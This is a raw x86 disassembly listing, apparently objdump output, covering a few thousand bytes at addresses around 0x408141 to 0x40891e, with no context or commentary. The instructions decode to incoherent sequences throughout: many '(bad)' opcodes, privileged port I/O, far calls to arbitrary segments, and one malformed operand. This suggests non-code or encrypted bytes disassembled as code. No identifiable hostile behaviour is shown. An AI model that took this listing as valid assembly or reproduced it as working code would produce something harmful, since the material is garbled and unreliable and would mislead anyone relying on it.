  408141:	enter  0x7163,0xc8
  408145:	mov    esp,DWORD PTR [eax-0x54]
  408148:	retf   0x38fc
  40814b:	out    0x74,eax
  40814d:	lock push es
  40814f:	loopne 0x4080e2
  408151:	test   cl,ch
  408153:	in     eax,dx
  408154:	fnstsw WORD PTR [edi]
  408156:	mov    bl,0xbb
  408158:	pop    ecx
  408159:	shl    dh,0xd8
  40815c:	xchg   DWORD PTR [edx+0x22364992],eax
  408162:	into   
  408163:	aad    0x7b
  408165:	bound  edi,QWORD PTR [esi-0x2e29f31d]
  40816b:	or     BYTE PTR [esi+ebp*4-0x51909b8b],bh
  408172:	mov    esp,DWORD PTR [edx-0x60]
  408175:	stos   DWORD PTR es:[edi],eax
  408176:	adc    ebp,DWORD PTR [esi+0x5adbc0f9]
  40817c:	push   0x7b
  40817e:	push   es
  40817f:	pop    ecx
  408180:	jae    0x4081f8
  408182:	ret    
  408183:	inc    edx
  408184:	pop    esi
  408185:	outs   dx,BYTE PTR ds:[esi]
  408186:	arpl   WORD PTR [esi+0x45],si
  408189:	jbe    0x408188
  40818b:	push   0x67
  40818d:	test   eax,0x225242ea
  408192:	jg     0x408188
  408194:	call   0x7b0d:0xfae4c53
  40819b:	gs sub esp,0xffffffce
  40819f:	mov    bl,0xd2
  4081a1:	mov    esp,0x382bd586
  4081a6:	mov    dh,0x31
  4081a8:	and    eax,0x66f43c1a
  4081ad:	lds    esi,FWORD PTR [ebx+0x26]
  4081b0:	pop    esp
  4081b1:	adc    dh,BYTE PTR [ecx-0x796d7bd4]
  4081b7:	(bad)  
  4081b8:	stos   BYTE PTR es:[edi],al
  4081b9:	jb     0x4081d3
  4081bb:	stos   DWORD PTR es:[edi],eax
  4081bc:	cdq    
  4081bd:	dec    esi
  4081be:	aam    0xcb
  4081c0:	lock iret 
  4081c2:	pop    ds
  4081c3:	jns    0x4081c9
  4081c5:	popf   
  4081c6:	aam    0x2d
  4081c8:	push   edx
  4081c9:	stc    
  4081ca:	xchg   esp,eax
  4081cb:	mov    cs,WORD PTR [esi-0x1e78adfb]
  4081d1:	int3   
  4081d2:	xchg   edx,eax
  4081d3:	xchg   esi,eax
  4081d4:	add    al,0x7c
  4081d6:	push   ss
  4081d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081d8:	sar    BYTE PTR [ecx+0x42],1
  4081db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081dc:	inc    edx
  4081dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081de:	loopne 0x4081f8
  4081e0:	jae    0x408223
  4081e2:	mov    BYTE PTR [edx-0x52],bh
  4081e5:	lds    ebx,FWORD PTR [ecx+0xb]
  4081e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081e9:	leave  
  4081ea:	aas    
  4081eb:	adc    al,0x15
  4081ed:	arpl   WORD PTR ds:0x72cd4d60,ax
  4081f3:	xchg   BYTE PTR [edi+0x2d],cl
  4081f6:	push   eax
  4081f7:	mov    esi,0x66cdc0fd
  4081fc:	cdq    
  4081fd:	xlat   BYTE PTR ds:[ebx]
  4081fe:	(bad)  
  4081ff:	cwde   
  408200:	call   0x380e:0xc8711352
  408207:	cwde   
  408208:	or     al,dh
  40820a:	lods   eax,DWORD PTR ds:[esi]
  40820b:	int    0x73
  40820d:	(bad)  
  40820e:	cmp    esi,edx
  408210:	clc    
  408211:	jbe    0x4081be
  408213:	lods   al,BYTE PTR ds:[esi]
  408214:	js     0x40825a
  408216:	xor    BYTE PTR [ebp-0x58],dh
  408219:	adc    al,0xc9
  40821b:	xor    cl,BYTE PTR [eax-0x2c0bad57]
  408221:	xchg   BYTE PTR ds:0xc1e3f472,cl
  408227:	xor    dh,dl
  408229:	xor    BYTE PTR [edx+0x3c],bh
  40822c:	jmp    0x408244
  40822e:	push   ebx
  40822f:	call   0x1bea:0x5150bd4f
  408236:	pop    eax
  408237:	cmp    al,0xf2
  408239:	sbb    DWORD PTR [ebx],esi
  40823b:	out    0xd9,eax
  40823d:	es push ebx
  40823f:	cs js  0x408238
  408242:	mov    bl,0xb7
  408244:	xor    eax,DWORD PTR [esi+0x41]
  408247:	xor    DWORD PTR [esi+0x23],ebx
  40824a:	loop   0x40824d
  40824c:	sub    BYTE PTR [ecx],al
  40824e:	retf   
  40824f:	mov    bl,0x71
  408251:	xor    bl,BYTE PTR fs:[edx+0x23e7c77b]
  408258:	ss sti 
  40825a:	loop   0x4081f6
  40825c:	or     ecx,DWORD PTR [edx]
  40825e:	mov    esi,0x6b4bfb55
  408263:	rcl    DWORD PTR [esi+0x3296516e],0x9e
  40826a:	dec    edx
  40826b:	cmc    
  40826c:	sar    DWORD PTR [ebp+0x7c],1
  40826f:	sbb    bh,bl
  408271:	xchg   edx,eax
  408272:	sti    
  408273:	(bad)  
  408275:	cmp    esp,DWORD PTR [ebp-0x2c]
  408278:	hlt    
  408279:	in     al,dx
  40827a:	jl     0x4082da
  40827c:	mov    dh,0xb1
  40827e:	int    0xa7
  408280:	dec    esi
  408281:	into   
  408282:	sub    eax,0xff0517c1
  408287:	in     eax,dx
  408288:	jecxz  0x408299
  40828a:	and    cl,BYTE PTR [ebx]
  40828c:	enter  0x2d06,0xe0
  408290:	mov    edi,0x388d7897
  408295:	shl    BYTE PTR [eax],0xd7
  408298:	test   DWORD PTR [bx+di-0x50e0],eax
  40829d:	ror    DWORD PTR [esi-0x4cbf6965],cl
  4082a3:	jb     0x4082cc
  4082a5:	adc    DWORD PTR [ebx+0x24],0x7581a322
  4082ac:	out    dx,eax
  4082ad:	xchg   DWORD PTR [ebx],ecx
  4082af:	sbb    ch,BYTE PTR [ebx+0x69e4e95]
  4082b5:	test   bl,bl
  4082b7:	jae    0x408291
  4082b9:	into   
  4082ba:	xchg   DWORD PTR [eax],ecx
  4082bc:	std    
  4082bd:	test   al,0xa2
  4082bf:	cwde   
  4082c0:	fld    QWORD PTR [eax+0x21]
  4082c3:	scas   eax,DWORD PTR es:[edi]
  4082c4:	mov    eax,0x3f282b2e
  4082c9:	std    
  4082ca:	das    
  4082cb:	add    eax,0x520becda
  4082d0:	call   0x66e9:0xb2c98fe9
  4082d7:	ret    0x505f
  4082da:	test   BYTE PTR [edi-0x28],bh
  4082dd:	call   0x1af0677d
  4082e2:	or     al,BYTE PTR [ebp-0x58]
  4082e5:	jmp    0xbc1f:0x530c90e2
  4082ec:	cli    
  4082ed:	sbb    eax,0x8279e98b
  4082f2:	rcl    dl,cl
  4082f4:	call   0x3063:0xaf8413eb
  4082fb:	inc    esp
  4082fc:	pusha  
  4082fd:	sar    DWORD PTR [edi],0x9e
  408300:	(bad)  
  408301:	jle    0x408328
  408303:	daa    
  408304:	adc    al,0xb9
  408306:	mov    esi,0x2c71d181
  40830b:	jo     0x40835b
  40830d:	and    bh,BYTE PTR [edi+0x1d175934]
  408313:	in     al,dx
  408314:	push   es
  408315:	jg     0x4082b9
  408317:	xchg   ebx,eax
  408318:	cmp    al,0x0
  40831a:	(bad)  
  40831b:	in     al,0x75
  40831d:	pop    ds
  40831e:	loop   0x40831f
  408320:	or     DWORD PTR [eax+0x38da2b0],edx
  408326:	data16 add bl,dl
  408329:	sub    DWORD PTR [edx],edi
  40832b:	aam    0x0
  40832d:	pop    esi
  40832e:	push   edx
  40832f:	in     al,dx
  408330:	rcl    DWORD PTR [edi+0xf],1
  408333:	xchg   esi,eax
  408334:	pslld  mm0,mm4
  408337:	jae    0x408382
  408339:	xchg   DWORD PTR [ebx-0x21],edx
  40833c:	int3   
  40833d:	fwait
  40833e:	push   esp
  40833f:	leave  
  408340:	rcr    DWORD PTR [ecx+0x3a29daaf],1
  408346:	ins    BYTE PTR es:[edi],dx
  408347:	inc    edi
  408348:	add    DWORD PTR [esi-0x25],0xffffffe6
  40834c:	adc    eax,0x12e4ecba
  408351:	data16 div BYTE PTR [ecx-0x3e5f291d]
  408358:	sbb    ebp,DWORD PTR [edx+0x5a]
  40835b:	cmp    ecx,DWORD PTR [edx+0x30]
  40835e:	and    DWORD PTR [ebx],ebx
  408360:	stc    
  408361:	jmp    0xbc28:0x25ea9ecb
  408368:	into   
  408369:	xor    bl,BYTE PTR [ebx+0x4e]
  40836c:	push   0xffffff9d
  40836e:	xor    dl,bh
  408370:	sbb    DWORD PTR [esi+ecx*8+0x36],0x53
  408375:	cmp    esp,DWORD PTR ss:[ebx-0x89740c1]
  40837c:	jge    0x408368
  40837e:	jb     0x4083db
  408380:	les    ebp,FWORD PTR [esi+esi*1-0x4b3cb18d]
  408387:	push   ebp
  408388:	sub    dl,al
  40838a:	inc    edx
  40838b:	lahf   
  40838c:	push   cs
  40838d:	out    0x57,al
  40838f:	adc    bl,0xf0
  408392:	adc    edi,DWORD PTR [esi+0x3047ed66]
  408398:	aam    0x2b
  40839a:	inc    esp
  40839b:	pushf  
  40839c:	test   al,0x7
  40839e:	and    edi,DWORD PTR [esi-0x6d04331c]
  4083a4:	jne    0x4083a6
  4083a6:	xor    eax,0xb97bf68e
  4083ab:	adc    eax,0xa65baa3c
  4083b0:	sbb    BYTE PTR [edx+ecx*8-0x2e],ch
  4083b4:	js     0x4083fc
  4083b6:	and    al,0x6a
  4083b8:	addr16 push ebx
  4083ba:	arpl   WORD PTR [edx+edi*8],dx
  4083bd:	or     al,cl
  4083bf:	in     al,dx
  4083c0:	sti    
  4083c1:	(bad)  
  4083c2:	(bad)  
  4083c3:	mov    bh,0xcf
  4083c5:	pop    es
  4083c6:	mov    cs,ebp
  4083c8:	mov    ecx,0x422f8674
  4083cd:	sbb    BYTE PTR [edx-0x3f],0xed
  4083d1:	mov    dh,0x5d
  4083d3:	and    dh,BYTE PTR [ebp+edi*8+0x30]
  4083d7:	push   ecx
  4083d8:	mov    ebp,0x6dfe597
  4083dd:	fdiv   st(3),st
  4083df:	mov    ch,0xf9
  4083e1:	ret    0xe8e1
  4083e4:	scas   al,BYTE PTR es:[edi]
  4083e5:	lds    ebp,FWORD PTR ds:0xd53227e6
  4083eb:	xchg   ebx,eax
  4083ec:	mov    WORD PTR [ecx],di
  4083ef:	inc    ebp
  4083f0:	mov    dl,0xad
  4083f2:	sbb    DWORD PTR [esp+ecx*1],eax
  4083f5:	pushf  
  4083f6:	dec    edx
  4083f7:	int3   
  4083f8:	push   0xf705ec16
  4083fd:	sub    al,0x2a
  4083ff:	repz pop eax
  408401:	mov    ds:0x7a21c44a,al
  408406:	aad    0xf6
  408408:	popa   
  408409:	lahf   
  40840a:	cmp    eax,0xe8f1430b
  40840f:	out    dx,eax
  408410:	sar    DWORD PTR [eax+0x115e8365],0x44
  408417:	sahf   
  408418:	sahf   
  408419:	mov    cl,0xed
  40841b:	mov    DWORD PTR [ebp+0x6b5cb30],0xdb1f3ed3
  408425:	or     edi,DWORD PTR [esi+0x68807889]
  40842b:	cmp    al,0x48
  40842d:	sub    al,0xee
  40842f:	cmc    
  408430:	jnp    0x4084af
  408432:	rol    BYTE PTR [ecx],cl
  408434:	mov    eax,ds:0x12ccf6e
  408439:	pop    ebp
  40843a:	mov    edi,ebp
  40843c:	iret   
  40843d:	stc    
  40843e:	popf   
  40843f:	shl    DWORD PTR [eax-0x61],0x8a
  408443:	aas    
  408444:	retf   
  408445:	push   0x9df0533d
  40844a:	xchg   esp,eax
  40844b:	and    ebp,DWORD PTR [esi]
  40844d:	mov    ebp,0xc4630cbc
  408452:	cwde   
  408453:	jns    0x408420
  408455:	mov    ebp,0xf402d84c
  40845a:	fadd   QWORD PTR [edx]
  40845c:	call   0x966d:0x48297fa7
  408463:	lahf   
  408464:	sub    edi,DWORD PTR [esp+esi*8-0x52]
  408468:	mov    al,0x5d
  40846a:	mov    ecx,es
  40846c:	jne    0x4084d4
  40846e:	mov    ds:0x7672da1a,al
  408473:	jp     0x408452
  408475:	loopne 0x40848b
  408477:	push   cs
  408478:	jp     0x408497
  40847a:	pop    edi
  40847b:	lock sti 
  40847d:	jns    0x4084b2
  40847f:	loop   0x4084ec
  408481:	stos   BYTE PTR es:[edi],al
  408482:	mov    dl,0xee
  408484:	pusha  
  408485:	mov    ah,BYTE PTR [eax]
  408487:	push   edi
  408488:	xlat   BYTE PTR ds:[ebx]
  408489:	sbb    dl,al
  40848b:	push   ebp
  40848c:	sub    bh,BYTE PTR [ebp-0x5d240813]
  408492:	inc    edi
  408493:	jo     0x4084e6
  408495:	pop    ds
  408496:	addr16 sbb edx,edi
  408499:	push   ebp
  40849a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40849b:	pop    es
  40849c:	mov    al,ds:0x48b9bab6
  4084a1:	aaa    
  4084a2:	fcomi  st,st(5)
  4084a4:	xor    ch,BYTE PTR [edi]
  4084a6:	push   edx
  4084a7:	or     bh,BYTE PTR [ebp+0x42]
  4084aa:	or     DWORD PTR [eax],0x4c
  4084ad:	adc    bl,BYTE PTR [ebx-0x5d1953e6]
  4084b3:	add    eax,0xb5fcc6f6
  4084b8:	inc    eax
  4084b9:	sahf   
  4084ba:	lods   al,BYTE PTR ss:[esi]
  4084bc:	sti    
  4084bd:	xchg   BYTE PTR [esp+edx*4-0x71],al
  4084c1:	inc    ecx
  4084c2:	or     DWORD PTR [eax],eax
  4084c4:	or     eax,0x53b59fa7
  4084c9:	jle    0x408520
  4084cb:	mov    al,0x64
  4084cd:	(bad)  [esi-0x1c]
  4084d0:	not    DWORD PTR es:[ebx+0x58]
  4084d4:	outs   dx,DWORD PTR ds:[esi]
  4084d5:	push   esi
  4084d6:	(bad)  
  4084d7:	stc    
  4084d8:	hlt    
  4084d9:	mov    DWORD PTR [eax+0x73],ebx
  4084dc:	js     0x4084b6
  4084de:	dec    eax
  4084df:	lods   eax,DWORD PTR ds:[esi]
  4084e0:	push   edx
  4084e1:	xchg   edx,eax
  4084e2:	push   ss
  4084e3:	jno    0x40852a
  4084e5:	xchg   esi,eax
  4084e6:	dec    ecx
  4084e7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4084e9:	pop    ds
  4084ea:	stos   DWORD PTR es:[edi],eax
  4084eb:	fsub   DWORD PTR [edi]
  4084ed:	cdq    
  4084ee:	fcmovbe st,st(5)
  4084f0:	or     al,0xfc
  4084f2:	fisubr DWORD PTR [edx]
  4084f4:	fwait
  4084f5:	jb     0x408498
  4084f7:	push   0xffffffd9
  4084f9:	dec    esi
  4084fa:	xchg   esp,eax
  4084fb:	ror    DWORD PTR [edi+0xc],cl
  4084fe:	push   edi
  4084ff:	jnp    0x4084c1
  408501:	mov    ebx,0x2c8dd433
  408506:	mov    edx,0x9bb2f1d8
  40850b:	add    edx,ebx
  40850d:	mov    bl,0xca
  40850f:	in     al,0x32
  408511:	or     BYTE PTR [ebp+0x3acac01d],bl
  408517:	lods   eax,DWORD PTR ds:[esi]
  408518:	and    ch,bl
  40851a:	jns    0x4084b9
  40851c:	int3   
  40851d:	in     eax,dx
  40851e:	arpl   WORD PTR [eax],dx
  408520:	sub    dh,BYTE PTR [ecx-0x70]
  408523:	jnp    0x40855d
  408525:	jmp    0x4084dd
  408527:	sub    al,0x6c
  408529:	or     al,BYTE PTR [edx*8-0x792fc5c3]
  408530:	test   bh,dh
  408532:	jo     0x40854d
  408534:	and    DWORD PTR [edi],0xffffffdb
  408537:	mov    cl,0xfa
  408539:	sub    eax,0xf88f6555
  40853e:	push   0x66
  408540:	and    ecx,ebp
  408542:	pop    esi
  408543:	shr    DWORD PTR cs:[eax],cl
  408546:	call   0xc31e239c
  40854b:	sbb    eax,0x3a3ae3d
  408550:	pop    ebx
  408551:	mov    ds:0x54ada650,eax
  408556:	xchg   DWORD PTR [edx],ecx
  408558:	adc    al,0xe5
  40855a:	xchg   edx,eax
  40855b:	adc    DWORD PTR [edx+ebp*4+0x46],0xfffffffa
  408560:	jl     0x40858b
  408562:	leave  
  408563:	sbb    eax,0x348ecefc
  408568:	mov    ebx,0x73cfa5a
  40856d:	dec    esi
  40856e:	ins    BYTE PTR es:[edi],dx
  40856f:	cmp    BYTE PTR [ebp+0x23ff09d7],dh
  408575:	out    dx,al
  408576:	jg     0x4085de
  408578:	imul   edi,DWORD PTR [ebx+ebp*8+0x2b86a38e],0xe5f531dc
  408583:	inc    bx
  408585:	or     al,0xe0
  408587:	add    cl,BYTE PTR [esi+0x6e]
  40858a:	mov    ecx,0x72c199fb
  40858f:	imul   esi,DWORD PTR [ebp+0x58],0x49b15e4a
  408596:	jns    0x4085b4
  408598:	test   BYTE PTR [edx+0x4ea5fc69],bl
  40859e:	adc    DWORD PTR [edi-0x29],esp
  4085a1:	or     BYTE PTR [ecx-0x51],ah
  4085a4:	mov    bl,0xa6
  4085a6:	fwait
  4085a7:	jbe    0x408561
  4085a9:	jb     0x408625
  4085ab:	les    ebx,FWORD PTR [esi-0x51]
  4085ae:	loopne 0x4085c6
  4085b0:	or     BYTE PTR [edi+ecx*2-0x1d1331f7],bh
  4085b7:	xchg   DWORD PTR [edx-0x7c892435],esp
  4085bd:	mov    edi,0x927012a2
  4085c2:	stc    
  4085c3:	out    dx,al
  4085c4:	ins    BYTE PTR es:[edi],dx
  4085c5:	out    0x14,eax
  4085c7:	gs stc 
  4085c9:	outs   dx,BYTE PTR ds:[esi]
  4085ca:	in     eax,0xb7
  4085cc:	int3   
  4085cd:	ins    DWORD PTR es:[edi],dx
  4085ce:	push   ebp
  4085cf:	mov    edi,esp
  4085d1:	das    
  4085d2:	in     eax,dx
  4085d3:	ins    DWORD PTR es:[edi],dx
  4085d4:	ficomp WORD PTR [edx+0xb]
  4085d7:	adc    al,0x28
  4085d9:	sbb    ebx,eax
  4085db:	dec    esi
  4085dc:	cmp    edi,DWORD PTR [ecx]
  4085de:	test   eax,0xc186d464
  4085e3:	push   ebx
  4085e4:	inc    edi
  4085e5:	and    eax,0x9706e5c4
  4085ea:	out    dx,al
  4085eb:	xor    bh,bh
  4085ed:	sbb    al,0x67
  4085ef:	(bad)  
  4085f1:	cvttps2pi mm6,QWORD PTR [ebp-0x4c73e30f]
  4085f8:	sbb    ah,BYTE PTR [edx+0x8]
  4085fb:	ss adc eax,0xae6a9bb3
  408601:	test   DWORD PTR [ebp-0x533e1309],ebx
  408607:	addr16 mov ebp,0x3cf3992a
  40860d:	or     cl,BYTE PTR [ecx-0x6f]
  408610:	in     al,dx
  408611:	cmp    BYTE PTR [ecx],0x1f
  408614:	and    eax,0x740c7e6e
  408619:	push   ebx
  40861a:	inc    esp
  40861b:	add    bl,0xaa
  40861e:	test   al,0xef
  408620:	push   ecx
  408621:	mov    cl,0x98
  408623:	(bad)  
  408624:	lods   al,BYTE PTR ds:[esi]
  408625:	daa    
  408626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408627:	aaa    
  408628:	mov    DWORD PTR [ebp+0x63],edi
  40862b:	jmp    0x745d88c8
  408630:	sub    cl,BYTE PTR ds:0x7c3532f8
  408636:	push   edx
  408637:	imul   esp,DWORD PTR [edx-0x63b3ede4],0xffffffa7
  40863e:	test   ch,dh
  408640:	jns    0x4085d8
  408642:	pop    edx
  408643:	push   cs
  408644:	xchg   DWORD PTR [ecx+esi*2],esi
  408647:	ins    DWORD PTR es:[edi],dx
  408648:	out    0x41,eax
  40864a:	dec    eax
  40864b:	cmp    al,0xd9
  40864d:	or     edi,DWORD PTR [ebx-0x5c400e41]
  408653:	sbb    al,bl
  408655:	fldcw  WORD PTR [ebp+0x5721cdc2]
  40865b:	mov    al,ds:0xce36102e
  408660:	add    esi,DWORD PTR ds:0x5a68a14e
  408666:	call   0x7f34:0xfcaaf725
  40866d:	mov    ch,0x1f
  40866f:	loope  0x4085f8
  408671:	mov    WORD PTR [eax+0x11],ss
  408674:	mov    fs,edi
  408676:	push   ecx
  408677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408678:	sets   BYTE PTR [esi+0x2f]
  40867c:	in     eax,dx
  40867d:	scas   eax,DWORD PTR es:[edi]
  40867e:	es mov dl,0xfb
  408681:	out    dx,eax
  408682:	dec    esp
  408683:	icebp  
  408684:	call   0x44cf:0x796358dd
  40868b:	(bad)  
  40868d:	repz sub al,0x76
  408690:	sahf   
  408691:	dec    ebp
  408692:	inc    esp
  408693:	mov    ebx,0xb03bff21
  408698:	sbb    BYTE PTR [ebx],0xe8
  40869b:	arpl   WORD PTR [eax-0xf],cx
  40869e:	cld    
  40869f:	repnz cdq 
  4086a1:	hlt    
  4086a2:	clc    
  4086a3:	sub    BYTE PTR [ebp-0x9],ah
  4086a6:	in     al,dx
  4086a7:	xchg   esi,eax
  4086a8:	pop    edx
  4086a9:	fst    QWORD PTR [eax]
  4086ab:	adc    eax,0xba9bdd38
  4086b0:	dec    ecx
  4086b1:	and    edi,edx
  4086b3:	(bad)  
  4086b5:	and    al,0x2a
  4086b7:	sub    ecx,DWORD PTR [ebp+0x66199e5d]
  4086bd:	call   0x5981ad9a
  4086c2:	pop    esi
  4086c3:	lock adc eax,0xf672fd48
  4086c9:	pop    edi
  4086ca:	ror    BYTE PTR [eax+edi*4+0x3d],cl
  4086ce:	push   cs
  4086cf:	push   ss
  4086d0:	xor    DWORD PTR [edi],edx
  4086d2:	pop    esp
  4086d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d4:	cmp    BYTE PTR [ebx+0x66],cl
  4086d7:	pop    eax
  4086d8:	out    dx,al
  4086d9:	push   esp
  4086da:	adc    DWORD PTR [eax+0x64],0x49eae127
  4086e1:	push   0x6042952f
  4086e6:	pop    es
  4086e7:	ins    BYTE PTR es:[edi],dx
  4086e8:	xchg   edi,eax
  4086e9:	jl     0x4086e5
  4086eb:	sbb    al,0x67
  4086ed:	inc    eax
  4086ee:	lahf   
  4086ef:	push   ebp
  4086f0:	je     0x4086a0
  4086f2:	in     eax,0x63
  4086f4:	in     eax,dx
  4086f5:	pop    ecx
  4086f6:	adc    edx,DWORD PTR [eax]
  4086f8:	mov    cl,0x4a
  4086fa:	in     eax,0xd
  4086fc:	mov    gs,WORD PTR [eax+eax*8-0x2]
  408700:	test   BYTE PTR [eax+0x5e],0x5b
  408704:	or     DWORD PTR [ecx+0x17e39a14],ecx
  40870a:	sti    
  40870b:	in     al,dx
  40870c:	cli    
  40870d:	ret    
  40870e:	sub    al,0x39
  408710:	inc    esp
  408711:	std    
  408712:	mov    esp,eax
  408714:	adc    BYTE PTR [ebp+0x1766bf13],0xd6
  40871b:	push   ebp
  40871c:	sbb    esp,DWORD PTR [eax-0x27]
  40871f:	sub    BYTE PTR [esi-0x5ceb0e92],cl
  408725:	xchg   BYTE PTR [edx+ebx*8],dl
  408728:	leave  
  408729:	ret    
  40872a:	cmp    dl,0x85
  40872d:	loop   0x4086d5
  40872f:	add    dl,al
  408731:	sub    ecx,DWORD PTR [esi+edi*4]
  408734:	xlat   BYTE PTR ds:[ebx]
  408735:	xchg   ebp,eax
  408736:	push   ebx
  408737:	xchg   ebx,eax
  408738:	fisttp WORD PTR [eax+0x3d074f6f]
  40873e:	inc    ebp
  40873f:	add    eax,0xfe433f48
  408744:	dec    eax
  408745:	rcl    DWORD PTR [ebx-0x5b462bb8],1
  40874b:	sbb    ah,0x81
  40874e:	gs dec esi
  408750:	repnz sbb al,0xfb
  408753:	jnp    0x4087c0
  408755:	iret   
  408756:	mov    eax,0x5503b5f5
  40875b:	inc    esp
  40875c:	sbb    BYTE PTR [edx+0x5f],bh
  40875f:	(bad)  
  408761:	jecxz  0x4087cf
  408763:	scas   al,BYTE PTR es:[edi]
  408764:	out    dx,al
  408765:	lock push edx
  408767:	mov    ebp,0x41d2ef23
  40876c:	mov    al,0xbf
  40876e:	imul   ebx,DWORD PTR [ebp+0xbda79ff],0x72
  408775:	mov    ebp,DWORD PTR [ecx]
  408777:	addr16 jne 0x4087a6
  40877a:	sti    
  40877b:	inc    eax
  40877c:	xlat   BYTE PTR ds:[ebx]
  40877d:	inc    edi
  40877e:	pop    edx
  40877f:	rcr    DWORD PTR [esi+eax*2-0x55],1
  408783:	div    BYTE PTR [edi+0x45b40335]
  408789:	test   BYTE PTR [ecx-0x6c],al
  40878c:	aas    
  40878d:	arpl   WORD PTR [edi],di
  40878f:	jmp    0x450bc1fb
  408794:	jno    0x408721
  408796:	cs adc bh,al
  408799:	mov    ds:0x8dbc1051,eax
  40879e:	dec    edi
  40879f:	test   al,0x5c
  4087a1:	pusha  
  4087a2:	repz add al,0xdb
  4087a5:	xor    dl,BYTE PTR [ebp-0x5ec324bc]
  4087ab:	push   esi
  4087ac:	arpl   WORD PTR [esi-0x6b3e3c32],di
  4087b2:	jne    0x4087f5
  4087b4:	mov    ch,ch
  4087b6:	mov    eax,0x93dec969
  4087bb:	je     0x4087e8
  4087bd:	mov    ?,WORD PTR [ebx-0x66f2fc10]
  4087c3:	mov    dl,0xa3
  4087c5:	inc    ecx
  4087c6:	lock shr DWORD PTR [ebx-0x3f368a29],0x0
  4087ce:	push   ss
  4087cf:	mov    dl,0xc4
  4087d1:	fwait
  4087d2:	lods   al,BYTE PTR ds:[esi]
  4087d3:	jo     0x40882d
  4087d5:	shr    BYTE PTR [eax],cl
  4087d7:	xchg   edi,eax
  4087d8:	jecxz  0x408764
  4087da:	cmp    eax,0xf4ef1f2a
  4087df:	repnz mov cl,0xa3
  4087e2:	and    eax,0x430793c1
  4087e7:	loope  0x40877c
  4087e9:	ss enter 0x7d4d,0xe4
  4087ee:	cs cs scas eax,DWORD PTR es:[edi]
  4087f1:	dec    edi
  4087f2:	rol    DWORD PTR [esi-0xddc3f74],0xb0
  4087f9:	xchg   ecx,eax
  4087fa:	push   edx
  4087fb:	sar    DWORD PTR [edx+0x216379fb],cl
  408801:	and    BYTE PTR [esi+0x27],dh
  408804:	jns    0x408797
  408806:	sub    eax,0x89664851
  40880b:	mov    ch,0x41
  40880d:	push   ebx
  40880e:	inc    edi
  40880f:	iret   
  408810:	add    eax,0x79b99127
  408815:	sub    dh,al
  408817:	(bad)  
  408818:	in     eax,dx
  408819:	adc    dh,BYTE PTR [eax-0x600330db]
  40881f:	jg     0x4087c7
  408821:	call   0xb264795
  408826:	mov    DWORD PTR [ecx+0x5f],edx
  408829:	loop   0x408833
  40882b:	xchg   ebx,eax
  40882c:	push   ecx
  40882d:	adc    DWORD PTR [ecx+0x65a10b3f],0xffffff92
  408834:	shl    ebx,0xfe
  408837:	mov    gs,WORD PTR [edi-0x7b]
  40883a:	es aaa 
  40883c:	inc    esp
  40883d:	inc    ebx
  40883e:	je     0x4087ff
  408840:	out    dx,al
  408841:	dec    edx
  408842:	icebp  
  408843:	outs   dx,DWORD PTR ds:[esi]
  408844:	jecxz  0x408874
  408846:	mov    bh,0x83
  408848:	sahf   
  408849:	mov    al,ds:0x6bb66621
  40884e:	sub    ebx,ecx
  408850:	outs   dx,DWORD PTR ds:[esi]
  408851:	pop    ebx
  408852:	test   DWORD PTR [esi+0x26],0x208b8422
  408859:	sub    al,BYTE PTR [edi-0x5a]
  40885c:	mov    dl,0x58
  40885e:	mov    BYTE PTR [ecx+0x6457609a],bh
  408864:	jns    0x4088d8
  408866:	enter  0x823f,0x4b
  40886a:	out    dx,eax
  40886b:	fiadd  DWORD PTR [edi-0x2c]
  40886e:	push   ebx
  40886f:	imul   esp,esi,0xeeaab0c2
  408875:	jg     0x40884a
  408877:	pop    ebx
  408878:	out    0x6e,eax
  40887a:	repz imul ebx,ebp,0x136ecb27
  408881:	sbb    al,0xaf
  408883:	mov    al,ds:0xef6fd6ea
  408888:	sbb    eax,0x3f7a355c
  40888d:	jle    0x408828
  40888f:	stos   DWORD PTR es:[edi],eax
  408890:	adc    eax,0x5ecd8c92
  408895:	xchg   ebx,eax
  408896:	daa    
  408897:	in     al,dx
  408898:	ret    
  408899:	nop
  40889a:	mov    eax,0xe3a8064
  40889f:	aad    0x1c
  4088a1:	xchg   esp,eax
  4088a2:	inc    ebp
  4088a3:	pop    edx
  4088a4:	mov    bh,0x17
  4088a6:	and    dh,al
  4088a8:	xchg   edi,eax
  4088a9:	xchg   ebp,eax
  4088aa:	aas    
  4088ab:	inc    esp
  4088ac:	(bad)  
  4088ad:	call   0x4c61:0xec6b0b12
  4088b4:	mov    dl,0xe
  4088b6:	add    ebx,edi
  4088b8:	les    ecx,FWORD PTR ds:0x522339d9
  4088be:	jmp    0xae04120d
  4088c3:	rcl    BYTE PTR [edi-0x78],cl
  4088c6:	ret    0xaec1
  4088c9:	cmp    ecx,DWORD PTR [esi+0x5e]
  4088cc:	scas   al,BYTE PTR es:[edi]
  4088cd:	jb     0x40892a
  4088cf:	enter  0x3549,0x70
  4088d3:	test   eax,0x2e624fdf
  4088d8:	fadd   QWORD PTR [ebx+0x13]
  4088db:	pop    ecx
  4088dc:	jp     0x4088ab
  4088de:	das    
  4088df:	inc    ebp
  4088e0:	ds pop edi
  4088e2:	xchg   ebx,eax
  4088e3:	pop    ds
  4088e4:	retf   
  4088e5:	adc    ebx,esi
  4088e7:	jbe    0x4088d8
  4088e9:	inc    edx
  4088ea:	sub    ecx,ebx
  4088ec:	outs   dx,BYTE PTR ds:[esi]
  4088ed:	xor    ecx,DWORD PTR [ebp+0xf860158]
  4088f3:	sbb    al,0xcc
  4088f5:	xor    eax,DWORD PTR es:[edi]
  4088f8:	dec    ebx
  4088f9:	bound  ebx,QWORD PTR [ecx+0x12]
  4088fc:	xchg   ebx,eax
  4088fd:	out    0x3a,al
  4088ff:	add    eax,0xb55c362e
  408904:	push   edx
  408905:	push   0x7b824273
  40890a:	xor    BYTE PTR [ebx-0x2834ce39],cl
  408910:	loopne 0x4088eb
  408912:	sbb    DWORD PTR [eax-0x22],0x63
  408916:	jb     0x408990
  408918:	mov    ds:0x7ae79c63,eax
  40891d:	inc    ebp
  40891e:	xor    eax,0x6c5e9466
